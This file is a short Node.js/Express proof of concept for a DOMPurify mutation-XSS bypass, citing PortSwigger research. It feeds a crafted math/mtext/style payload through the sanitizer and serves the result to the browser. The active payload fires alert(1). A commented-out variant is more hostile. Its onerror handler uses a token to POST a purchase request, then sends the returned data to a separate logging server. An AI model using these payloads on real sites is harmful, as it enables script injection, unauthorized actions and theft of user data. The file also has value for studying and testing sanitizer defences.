//This is PoC
//If you want to know more, you can refer to https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss
const DOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const express = require('express');
const app = express();

app.get('/', (req, res) => {
  function sanitizeDirtyHTML() {
    const { window } = new JSDOM('');
    const purify = DOMPurify(window);

    //let dirty = `<math><mtext><table><mglyph><style><!--</style><img title="--></mglyph><img src=''  onerror=fetch('${url}/4/buy',{method:'POST',headers:{'Content-Type':'application/json','token':'${token}'}}).then(function(response){response.json().then(function(data){fetch('${serverLogUrl}/log',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:data.data})})})})>">`;

    let dirty = `<math><mtext><table><mglyph><style><!--</style><img :title="--></mglyph><img\t src=1\t onerror=alert(1)>"/>`;

    let clean = purify.sanitize(dirty);

    return clean;
  }

  const cleanHTML = sanitizeDirtyHTML();

  res.send(`
    <html>
      <head>
        <title>Sanitized Output</title>
      </head>
      <body>
        <div id="output">${cleanHTML}</div>
      </body>
    </html>
  `);
});

const port = 5000;
app.listen(port, () => {
  console.log(`http://localhost:${port}`);
});